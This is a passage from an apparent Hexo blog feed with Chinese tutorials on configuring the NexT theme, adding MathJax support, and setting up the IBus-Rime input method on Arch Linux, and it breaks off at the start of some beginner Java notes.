<figure class="highlight yml"><figcaption><span>$blog/_config.next.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">bookmark:</span>	</span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span>	</span><br><span class="line">  <span class="attr">color:</span> <span class="string">&quot;#222&quot;</span></span><br><span class="line">  <span class="attr">save:</span> <span class="string">auto</span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h2 id="字数统计与阅读时长"><a href="#字数统计与阅读时长" class="headerlink" title="字数统计与阅读时长"></a>字数统计与阅读时长</h2><p>安装插件:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">yarn add hexo-symbols-count-time</span><br></pre></td></tr></table></figure>
<p>配置:</p>
<p>主题配置文件:</p>
<figure class="highlight yml"><figcaption><span>$blog/_config.next.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">symbols_count_time:</span></span><br><span class="line">  <span class="attr">separated_meta:</span> <span class="literal">true</span> 		<span class="comment"># 统计信息不换行显示</span></span><br><span class="line">  <span class="attr">item_text_post:</span> <span class="literal">true</span> 		<span class="comment"># 是否显示“本文字数/阅读时长”等描述文字</span></span><br><span class="line">  <span class="attr">item_text_total:</span> <span class="literal">false</span> 	<span class="comment"># 底部footer信息中是否显示“本文字数/阅读时长”等描述文字</span></span><br><span class="line">  <span class="attr">awl:</span> <span class="number">4</span> 					<span class="comment"># 平均字符长度</span></span><br><span class="line">  <span class="attr">wpm:</span> <span class="number">275</span> 					<span class="comment"># 阅读速度, 一分钟阅读的字数</span></span><br></pre></td></tr></table></figure>
<p>站点配置文件添加:</p>
<figure class="highlight yml"><figcaption><span>$blog/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment"># 新增文章字数统计</span></span><br><span class="line"><span class="attr">symbols_count_time:</span></span><br><span class="line">  <span class="comment">#文章内是否显示</span></span><br><span class="line">  <span class="attr">symbols:</span> <span class="literal">true</span> 	<span class="comment"># 文章字数</span></span><br><span class="line">  <span class="attr">time:</span> <span class="literal">true</span> 		<span class="comment"># 阅读时长</span></span><br><span class="line">  <span class="comment"># 网页底部是否显示</span></span><br><span class="line">  <span class="attr">total_symbols:</span> <span class="literal">false</span> 	<span class="comment"># 所有文章总字数</span></span><br><span class="line">  <span class="attr">total_time:</span> <span class="literal">false</span> 	<span class="comment"># 所有文章阅读中时长</span></span><br></pre></td></tr></table></figure>
<h2 id="进度"><a href="#进度" class="headerlink" title="进度"></a>进度</h2><figure class="highlight yml"><figcaption><span>$blog/_config.next.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment"># 浏览进度</span></span><br><span class="line"><span class="attr">back2top:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span> 			<span class="comment"># 是否提供一键置顶 </span></span><br><span class="line">  <span class="attr">sidebar:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">scrollpercent:</span> <span class="literal">true</span> 	<span class="comment"># 是否显示当前阅读进度</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 阅读进度</span></span><br><span class="line"><span class="attr">reading_progress:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">position:</span> <span class="string">top</span></span><br><span class="line">  <span class="attr">color:</span> <span class="string">&quot;#37c6c0&quot;</span></span><br><span class="line">  <span class="attr">height:</span> <span class="string">3px</span></span><br></pre></td></tr></table></figure>
<h2 id="图片延迟加载"><a href="#图片延迟加载" class="headerlink" title="图片延迟加载"></a>图片延迟加载</h2><p>访问到图片位置时才请求图片资源，可提高博客的访问速度</p>
<p><a href="https://github.com/theme-next/theme-next-jquery-lazyload">theme-next-jquery-lazyload</a></p>
<p>开启配置:</p>
<figure class="highlight yml"><figcaption><span>$blog/_config.next.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">lazyload:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Lazyload</span></span><br><span class="line">  <span class="attr">lazyload:</span> <span class="string">//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js</span></span><br><span class="line">  <span class="comment"># lazyload: //cdnjs.cloudflare.com/ajax/libs/lozad.js/1.14.0/lozad.min.js</span></span><br><span class="line">  <span class="comment"># lazyload:</span></span><br></pre></td></tr></table></figure>
<h2 id="图片灯箱"><a href="#图片灯箱" class="headerlink" title="图片灯箱"></a>图片灯箱</h2><p>添加灯箱功能，实现点击图片后放大图片，支持幻灯片播放、全屏播放、缩略图、分享等</p>
<p><a href="https://github.com/fancyapps/fancybox">fancyBox</a></p>
<p><a href="https://github.com/theme-next/theme-next-fancybox3">theme-next-fancybox3 </a></p>
<p>开启配置:</p>
<figure class="highlight yml"><figcaption><span>$blog/_config.next.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">fancybox:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># FancyBox</span></span><br><span class="line">  <span class="attr">jquery:</span> <span class="string">//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js</span></span><br><span class="line">  <span class="attr">fancybox:</span> <span class="string">//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js</span></span><br><span class="line">  <span class="attr">fancybox_css:</span> <span class="string">//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css</span></span><br><span class="line">  <span class="comment">#jquery:</span></span><br><span class="line">  <span class="comment">#fancybox:</span></span><br><span class="line">  <span class="comment">#fancybox_css:</span></span><br></pre></td></tr></table></figure>
<h2 id="代码高亮主题"><a href="#代码高亮主题" class="headerlink" title="代码高亮主题"></a>代码高亮主题</h2><p>NexT 使用 <a href="https://github.com/chriskempson/tomorrow-theme">Tomorrow Theme</a> 作为代码高亮，共5款主题可供选择。 默认使用的是 白色(normal) 主题，可选值有 <code>normal</code>，<code>night</code>， <code>night blue</code>， <code>night bright</code>， <code>night eighties</code></p>
<p>normal: <img data-src="Tomorrow.png" alt="normal">   night: <img data-src="Tomorrow-Night.png" alt="night"><br>night blue: <img data-src="Tomorrow-Night-Blue.png" alt="night blue"> night bright: <img data-src="Tomorrow-Night-Bright.png" alt="night bright"><br>night eighties: <img data-src="Tomorrow-Night-Eighties.png" alt="night eighties"></p>
<figure class="highlight yml"><figcaption><span>$blog/_config.next.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">codeblock:</span></span><br><span class="line">   <span class="attr">highlight_theme:</span> <span class="string">normal</span></span><br></pre></td></tr></table></figure>
<h2 id="代码块复制按钮"><a href="#代码块复制按钮" class="headerlink" title="代码块复制按钮"></a>代码块复制按钮</h2><figure class="highlight yml"><figcaption><span>$blog/_config.next.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">codeblock:</span></span><br><span class="line">  <span class="attr">copy_button:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span>      	<span class="comment"># 启用复制按钮</span></span><br><span class="line">    <span class="attr">show_result:</span> <span class="literal">true</span>  	<span class="comment"># 点击复制完后是否显示 复制成功 结果提示</span></span><br></pre></td></tr></table></figure>
<h1 id="Hexo进阶"><a href="#Hexo进阶" class="headerlink" title="Hexo进阶"></a>Hexo进阶</h1><h2 id="博文"><a href="#博文" class="headerlink" title="博文"></a>博文</h2><p>在 <code>$blog/scaffolds/</code> 中定义了多个模板，在新建文章时，Hexo 会根据 <code>scaffolds</code> 文件夹内相对应的文件来建立文件</p>
<p>官方默认模板:</p>
<ul>
<li><code>post</code> : 不指定模板时默认使用(由 <code>$blog/_config.yml</code> 中的 <code>default_layout</code> 参数控制默认值)，创建的文件将放在 <code>source/_posts</code></li>
<li><code>draft</code> : 草稿模板,避免写到一半的文章被发布,创建的文件将放在<code>source/_drafts</code></li>
<li><code>page</code> : 给站点添加子模块面页(如分类模块,分类模块,关于模块),创建的文件放于 <code>source/</code></li>
</ul>
<p><code>draft</code> 布局用于创建草稿，<code>source/_drafts</code>下的文档不会渲染到网站中，当文章需要数天才能完成，建议使用草稿模板布局</p>
<p>也可将新建文档时的默认布局设置为 <code>draft</code>，每次创建的默认布局都将时草稿</p>
<figure class="highlight diff"><figcaption><span>$blog/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="deletion">- default_layout: post</span></span><br><span class="line"><span class="addition">+ default_layout: draft</span></span><br></pre></td></tr></table></figure>
<p>如需渲染草稿使用: <code>hexo server --draft</code><br>将草稿发布为正式文章: <code>hexo publish [layout] &lt;filename&gt;</code> ，命令会将 <code>$blog/source/_drafts</code> 下的文章移动到 <code>$blog/source/_posts</code> （用 mv 也可以)</p>
<p><strong>新建模板</strong>:</p>
<p>想实现发不同类型的文章，比如娱乐、技术等，可先创建需要的模板，通过 <code>hexo new [layout] &lt;title&gt;</code> 新建该模板布局(layout)的文章，文章会默认被创建在 <code>source/_posts</code> 中</p>
<p>新建一个模板只需在 <code>scaffolds</code> 下创建一个模板文件即可，Hexo 默认安装了 <code>hexo-renderer-marked</code> 和 <code>hexo-renderer-ejs</code> 因此不仅可以用 Markdown 写作，还可以用 EJS 写作,即可创建 <code>md</code> 和 <code>ejs</code> 扩展名的模板。如果安装了 <code>hexo-renderer-pug</code>，甚至可以用 Pug 模板语言书写文章</p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: &#123;&#123; title &#125;&#125;</span><br><span class="line">date: &#123;&#123; date &#125;&#125;</span><br><span class="line">tags: []</span><br><span class="line">categories: []</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">等等其他内容可自行添加</span><br></pre></td></tr></table></figure>
<p>属性：</p>
<ul>
<li><code>title</code>：定义了博文的标题</li>
<li><code>date</code>：定义了创作此博文的时间</li>
<li><code>tags</code>：定义了博文的标签</li>
<li><code>categories</code>：定义了博文的种类</li>
</ul>
<p>Hexo 默认以标题做为文件名称，可编辑 <code>new_post_name</code> 参数来改变默认的文件名称，举例来说，设为 <code>:year-:month-:day-:title.md</code> 可方便通过日期来管理文章。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">变量</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>:title</code></td>
<td style="text-align:left">标题（小写，空格将会被替换为短杠）</td>
</tr>
<tr>
<td style="text-align:center"><code>:year</code></td>
<td style="text-align:left">建立的年份(4位)，如， 2015</td>
</tr>
<tr>
<td style="text-align:center"><code>:month</code></td>
<td style="text-align:left">建立的月份（2位），如， 04</td>
</tr>
<tr>
<td style="text-align:center"><code>:i_month</code></td>
<td style="text-align:left">建立的月份（无前导零），如， 4</td>
</tr>
<tr>
<td style="text-align:center"><code>:day</code></td>
<td style="text-align:left">建立的日期（2位），如， 07</td>
</tr>
<tr>
<td style="text-align:center"><code>:i_day</code></td>
<td style="text-align:left">建立的日期（无前导零），如， 7</td>
</tr>
</tbody>
</table>
</div>
<h2 id="博文用资源"><a href="#博文用资源" class="headerlink" title="博文用资源"></a>博文用资源</h2><p>资源（Asset）代表 <code>source</code> 中除了文章以外的所有文件，如图片、CSS、JS 文件等。若 Hexo项目中只有少量图片，那最简单的方法就是将它们放在 <code>source/images</code> 文件夹中。然后通过 <code>![](/images/image.jpg)</code> 访问,若图片很多可以考虑使用图床</p>
<p>当某个文章要引用一些特定资源时，可开启文章资源文件夹到目的，在创建文章的同时创建一个同名文件夹用于存放资源</p>
<figure class="highlight yml"><figcaption><span>$blog/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p>然后就可用 Hexo 的<a href="https://hexo.io/docs/tag-plugins">标签插件</a>调用资源</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% asset_path &lt;slug&gt; %&#125;</span><br><span class="line">&#123;% asset_img &lt;slug&gt; [title] %&#125;</span><br><span class="line">&#123;% asset_link &lt;slug&gt; [title] %&#125;</span><br></pre></td></tr></table></figure>
<p>如将图片 <code>example.jpg</code> 放入资源文件夹中，可通过以下标签插件引用:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% asset_img example.jpg This is an example image %&#125;</span><br></pre></td></tr></table></figure>
<p>hexo-renderer-marked 3.1.0 引入了一个新选项，无需使用 <code>asset_img</code> 标签插件即可将图片嵌入markdown:</p>
<figure class="highlight yml"><figcaption><span>$blog/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">marked:</span></span><br><span class="line">  <span class="attr">prependRoot:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">postAsset:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p>然后通过使用 <code>![](image.jpg)</code> 引用资源文件夹中的内容</p>
<h2 id="永久链接"><a href="#永久链接" class="headerlink" title="永久链接"></a>永久链接</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">yarn add hexo-abbrlink</span><br></pre></td></tr></table></figure>
<figure class="highlight diff"><figcaption><span>$blog/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="deletion">- permalink: :year/:month/:day/:title/</span></span><br><span class="line"><span class="addition">+ permalink: posts/:abbrlink/</span></span><br><span class="line"></span><br><span class="line"><span class="addition">+ abbrlink:</span></span><br><span class="line"><span class="addition">+  alg: crc32  # 算法：crc16(default) and crc32</span></span><br><span class="line"><span class="addition">+  rep: hex    # 进制：dec(default) and hex</span></span><br></pre></td></tr></table></figure>
<h2 id="代码块进阶"><a href="#代码块进阶" class="headerlink" title="代码块进阶"></a>代码块进阶</h2><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">​``` [language] [title] [url] [link text]</span><br><span class="line"></span><br><span class="line">代码块</span><br><span class="line"></span><br><span class="line">​```</span><br></pre></td></tr></table></figure>
<p>各参数如下：</p>
<ul>
<li><code>langugae</code>：语言名称，引导渲染引擎正确解析并高亮显示关键字</li>
<li><code>title</code>：代码块标题，显示在左上角</li>
<li><code>url</code>：链接地址，如果没有指定 link text 则会在右上角显示 link</li>
<li><code>link text</code>：链接名称，指定 <code>url</code> 后有效，会显示在右上角 <code>url</code> 必须为有效链接地址才以链接的形式显示在右上角，否则将作为标题显示在左上角。<br>以 <code>url</code> 为分界，左侧除了第一个单词会被解析为 <code>language</code>，其他所有单词都会被解析为 <code>title</code>，而右侧的所有单词都会被解析为 <code>link text</code>。 如果不想填写 <code>title</code>，需要在 <code>language</code> 和 <code>url</code> 之间添加至少三个空格</li>
</ul>
<h1 id="更多进阶参考"><a href="#更多进阶参考" class="headerlink" title="更多进阶参考"></a>更多进阶参考</h1><p><a href="https://tding.top/tags/Hexo/">小丁的个人博客</a></p>
<p><a href="https://jrbcode.gitee.io/tags/Hexo/">CodeHeap</a></p>
<p><a href="http://yearito.cn/tags/Hexo/">Yearito’s Blog</a></p>
<p><a href="https://hexo.io/zh-cn/docs/">Hexo doc</a></p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo配置支持MathJax</title>
    <url>/posts/e318a4e5/</url>
    <content><![CDATA[<h1 id="替换Marked"><a href="#替换Marked" class="headerlink" title="替换Marked"></a>替换Marked</h1><p>  <code>hexo</code> 默认的渲染引擎是<code>marked</code>，但是 <code>marked</code> 不支持 <code>MathJax</code>。 <code>pandoc</code>和<code>kramed</code> ，能够支持<code>MathJax</code>。</p>
<p><a href="https://github.com/wzpan/hexo-renderer-pandoc">pandoc项目</a></p>
<p><a href="https://github.com/sun11/hexo-renderer-kramed">kramed项目</a></p>
<p>先卸载原来默认的渲染引擎<code>hexo-renderer-marked</code>，然后安装<code>hexo-renderer-pandoc</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn remove hexo-renderer-marked</span><br><span class="line">yarn add hexo-renderer-pandoc</span><br></pre></td></tr></table></figure>
<p>安装 <code>hexo-renderer-pandoc</code> 还需要安装 <code>pandoc</code> (version &gt;=2.0) 渲染器支持，Arch 安装: <code>sudo pacman -S pandoc</code></p>
<p><code>hexo-renderer-kramed</code> 是基于 <code>hexo-renderer-marked</code> 改的，所以不用单独安装渲染器，但 <code>next</code> 官方不推荐使用。</p>
<a id="more"></a>
<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p><strong>博客目录下</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/_config.yml</span><br></pre></td></tr></table></figure>
<p>找到<code>math</code>配置项开启</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Math Formulas Render Support</span></span><br><span class="line"><span class="attr">math:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment"># 默认值（true）将按需加载mathjax / katex脚本去渲染在Front-matter中具有`mathjax：true`的页面。</span></span><br><span class="line">  <span class="comment"># 如果将其设置为false，它将在每一页加载mathjax/katex脚本</span></span><br><span class="line">  <span class="attr">per_page:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 完整的MathJax支持所需的hexo-renderer-pandoc（或hexo-renderer-kramed）</span></span><br><span class="line">  <span class="attr">mathjax:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="comment"># https://mhchem.github.io/MathJax-mhchem/</span></span><br><span class="line">    <span class="attr">mhchem:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 完整的Katex支持需要hexo-renderer-markdown-it-plus（或带有markdown-it-katex插件的hexo-renderer-markdown-it）</span></span><br><span class="line">  <span class="attr">katex:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">    <span class="comment"># https://github.com/KaTeX/KaTeX/tree/master/contrib/copy-tex</span></span><br><span class="line">    <span class="attr">copy_tex:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>
<p><strong>在需要使用Mathjax的文章<code>Front-matter</code>中添加<code>mathjax: true</code></strong></p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: 文章名</span><br><span class="line">category: 分类</span><br><span class="line">date: 2019/10/09</span><br><span class="line">mathjax: true</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
<h1 id="方案2"><a href="#方案2" class="headerlink" title="方案2"></a>方案2</h1><p>  另一种方案是使用<a href="https://github.com/CHENXCHEN/hexo-renderer-markdown-it-plus">hexo-renderer-markdown-it-plus</a></p>
<p>参考:<a href="https://ranmaosong.github.io/2017/11/29/hexo-support-mathjax/">如何在hexo中支持Mathjax?</a></p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>MathJax</tag>
      </tags>
  </entry>
  <entry>
    <title>IBus-Rime输入法安装配置</title>
    <url>/posts/98511854/</url>
    <content><![CDATA[<p>  Ibus是Linux上打输入法引擎，搜狗使用的是Fcitx引擎，但受够了搜狗的中文乱码问题(花了三天在网找各种方案尝试都没解决)，且Gnome桌面已经集成了IBus,现在决定跳槽IBus,虽然没有了像搜狗输入法那样的好看皮肤，但比没法输入好。</p>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p><strong>安装ibus</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S ibus</span><br></pre></td></tr></table></figure></p>
<h2 id="安装中文输入法rime"><a href="#安装中文输入法rime" class="headerlink" title="安装中文输入法rime"></a>安装中文输入法rime</h2><a id="more"></a>
<p>直接开始安装rime也可以，包管理器会自动安装ibus<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S ibus-rime</span><br></pre></td></tr></table></figure></p>
<h2 id="安装输入方案"><a href="#安装输入方案" class="headerlink" title="安装输入方案"></a>安装输入方案</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 朙月拼音（预装）</span></span><br><span class="line">sudo pacman librime-data-luna-pinyin</span><br><span class="line"><span class="comment"># 双拼</span></span><br><span class="line">sudo pacman -S librime-data-double-pinyin</span><br><span class="line"><span class="comment"># 宫保拼音</span></span><br><span class="line">sudo pacman -S librime-data-combo-pinyin</span><br><span class="line"><span class="comment"># 注音、地球拼音</span></span><br><span class="line">sudo pacman -S librime-data-terra-pinyin librime-data-bopomofo</span><br><span class="line"><span class="comment"># 仓颉五代（预装）</span></span><br><span class="line">sudo pacman -S librime-data-cangjie5</span><br><span class="line"><span class="comment"># 速成五代</span></span><br><span class="line">sudo pacman -S librime-data-quick5</span><br><span class="line"><span class="comment"># 五笔86、袖珍简化字拼音、五笔画</span></span><br><span class="line">sudo pacman -S librime-data-wubi librime-data-pinyin-simp librime-data-stroke-simp</span><br><span class="line"><span class="comment"># 上海吴语</span></span><br><span class="line">sudo pacman -S librime-data-wugniu</span><br><span class="line"><span class="comment"># 粤拼</span></span><br><span class="line">sudo pacman -S librime-data-jyutping</span><br><span class="line"><span class="comment"># 中古汉语拼音</span></span><br><span class="line">sudo pacman -S librime-data-zyenpheng</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="安装qt程序支持包"><a href="#安装qt程序支持包" class="headerlink" title="安装qt程序支持包"></a>安装qt程序支持包</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yay -S ibus-qt</span><br></pre></td></tr></table></figure>
<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><h2 id="非gnome桌面配置"><a href="#非gnome桌面配置" class="headerlink" title="非gnome桌面配置"></a>非gnome桌面配置</h2><p><strong>gnome桌面直接跳过</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim ~/.xprofile 		<span class="comment"># 没有就新建该文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加入内容</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> GTK_IM_MODULE=ibus</span><br><span class="line"><span class="built_in">export</span> XMODIFIERS=@im=ibus</span><br><span class="line"><span class="built_in">export</span> QT_IM_MODULE=ibus</span><br><span class="line">ibus-daemon -x -d</span><br></pre></td></tr></table></figure><br><strong>重启系统即可</strong></p>
<h2 id="配置rime"><a href="#配置rime" class="headerlink" title="配置rime"></a>配置rime</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim ~/.config/ibus/rime/default.custom.yaml  <span class="comment">#新建rime定制文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加入内容,保存后重新部署rime</span></span><br><span class="line">patch:</span><br><span class="line">  schema_list:</span><br><span class="line">    - schema: luna_pinyin</span><br></pre></td></tr></table></figure>
<p>排序很重要，该文件会向 Rime 表明，将输入方案改成这份只包含 <code>luna_pinyin</code> (朙月拼音) 等的选项</p>
<p><strong>可以使用的方案清单：</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- luna_pinyin (朙月拼音)</span><br><span class="line">- terra-pinyin (地球拼音)</span><br><span class="line">- terra_pinyin (拼音跟声调)</span><br><span class="line">- combo_pinyin (宫保拼音)</span><br><span class="line">- bopomofo (注音)</span><br><span class="line">- double_pinyin (双拼)</span><br><span class="line">- cangjie5 (仓颉五代)</span><br><span class="line">- wubi86 (五笔86)</span><br><span class="line">- pinyin-simp (袖珍简化字拼音)</span><br><span class="line">- stroke_simp (五笔画)</span><br><span class="line">- jyutping (粤拼)</span><br><span class="line">- wugniu (上海吴语)</span><br><span class="line">- zyenpheng (中古汉语拼音)</span><br></pre></td></tr></table></figure></p>
<h1 id="添加输入法"><a href="#添加输入法" class="headerlink" title="添加输入法"></a>添加输入法</h1><h2 id="非gnome桌面"><a href="#非gnome桌面" class="headerlink" title="非gnome桌面"></a>非gnome桌面</h2><p>IBus首选项 ==&gt; 输入法 ==&gt; 添加 ==&gt; 中文 ==&gt; Rime</p>
<h2 id="gnome桌面"><a href="#gnome桌面" class="headerlink" title="gnome桌面"></a>gnome桌面</h2><p><strong>只有添加了多个输入源后状态烂才会显示输入法</strong><br><strong>使用Super键(Windows键)+空格键换输入法</strong></p>
<p>设置 ==&gt; 区域与语言 ==&gt; 输入源 ==&gt; 添加 ==&gt; 汉语 ==&gt; 选择rime添加</p>
<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p><strong>使用rime时，按<code>Ctrl+`` 或</code>F4` 可进行输入切换</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 拼音</span><br><span class="line">2. 中文　－›　西文</span><br><span class="line">3. 全角　－›　半角</span><br><span class="line">4. 漢字　－›　汉字</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p><strong>将候选框横向显示</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim ~/.config/ibus/rime/build/ibus_rime.yaml  <span class="comment">#新建文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加内容，保存后重新部署rime</span></span><br><span class="line">style:</span><br><span class="line">	horizontal: <span class="literal">true</span></span><br></pre></td></tr></table></figure></p>
<p><strong>默认英文输入，需要中文时再切换</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim .config/ibus/rime/luna_pinyin.custom.yaml  <span class="comment">#新建朙月拼音定制文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加入内容,保存后重新部署rime</span></span><br><span class="line"><span class="comment"># 0或1两种状态</span></span><br><span class="line"></span><br><span class="line">patch:</span><br><span class="line">  <span class="string">&quot;switches/@0/reset&quot;</span>: 1</span><br></pre></td></tr></table></figure></p>
<p><strong>定制字体字号</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim .config/ibus/rime/luna_pinyin.custom.yaml  <span class="comment">#朙月拼音定制文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加定制</span></span><br><span class="line"></span><br><span class="line">patch:</span><br><span class="line">  <span class="string">&quot;style/font_face&quot;</span>: <span class="string">&quot;明兰&quot;</span>  <span class="comment"># 字体名称，从记事本等处的系统字体对话框里能看到</span></span><br><span class="line">  <span class="string">&quot;style/font_point&quot;</span>: 14     <span class="comment"># 字号，只认数字的，不认「五号」、「小五」这样的</span></span><br></pre></td></tr></table></figure></p>
<p><strong>定制皮肤配色</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim .config/ibus/rime/luna_pinyin.custom.yaml  <span class="comment">#朙月拼音定制文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加定制</span></span><br><span class="line"></span><br><span class="line">patch:</span><br><span class="line">	<span class="string">&quot;style/color_scheme&quot;</span>: mecolor 	<span class="comment"># 用于选中下面定义的新方案</span></span><br><span class="line">	<span class="string">&quot;preset_color_schemes/mecolor&quot;</span>: <span class="comment"># 在配色方案列表里加入标识为 mecolor 的新方案</span></span><br><span class="line">        name: mecolor</span><br><span class="line">        author: eonun</span><br><span class="line">        back_color: 0xEBEBEB 		<span class="comment"># 底色 24位色值，用十六进制书写方便</span></span><br><span class="line">        border_color: 0xE6E6E6 		<span class="comment"># 边框颜色</span></span><br><span class="line">        text_color: 0x992E8E 		<span class="comment"># 编码行文字颜色</span></span><br><span class="line">        hilited_text_color: 0x6F6FED 	<span class="comment"># 高亮文字</span></span><br><span class="line">        hilited_back_color: 0xDDDDDD 	<span class="comment"># 高亮文字的底色</span></span><br><span class="line">        hilited_candidate_text_color: 0x1303FF 	<span class="comment"># 高亮候选项的文字颜色</span></span><br><span class="line">        hilited_candidate_back_color: 0xCFCBC8 	<span class="comment"># 高亮候选项的底色</span></span><br><span class="line">        candidate_text_color: 0xFFFFFF 	<span class="comment"># 候选项文字颜色</span></span><br><span class="line">        comment_text_color: 0x4A95B5 	<span class="comment"># 候选项提示</span></span><br></pre></td></tr></table></figure>
<p><strong><a href="https://bennyyip.github.io/Rime-See-Me/">配色生成器</a></strong></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Ibus</tag>
        <tag>输入法</tag>
      </tags>
  </entry>
  <entry>
    <title>Java笔记整理（初级）</title>
    <url>/posts/4947184c/</url>
    <content><![CDATA[<h1 id="Java笔记整理（初级）"><a href="#Java笔记整理（初级）" class="headerlink" title="Java笔记整理（初级）"></a>Java笔记整理（初级）</h1><p>程序是用来给人服务的，不要被束缚了思想，我们是为了实现某个目的来学习编程写代码的，而不是说为了编程而学编程。语法是固有存在的，需要怎么用才能到达目的是灵活变通的，学习编程就如学习加减法：1+1=2,2-1=1…是固有的，而想要怎么加怎么减才能得到想要的数那是千变万化的。<strong>固有的部分需要死记硬背，变化的部分需要用死记硬背的内容来灵活变通。</strong>其实固有的部分多敲多写就能记下的，剩下的就是学会如何变通达到目的就行了（算法）。</p>
<p>如果我现在想让程序输出一段话，就会用到编程入门万年不变的第一个程序<code>Holle Word</code></p>
<h3 id="编程入门万年不变的第一个程序"><a href="#编程入门万年不变的第一个程序" class="headerlink" title="编程入门万年不变的第一个程序"></a>编程入门万年不变的第一个程序</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim 第一个程序.java</span><br></pre></td></tr></table></figure>
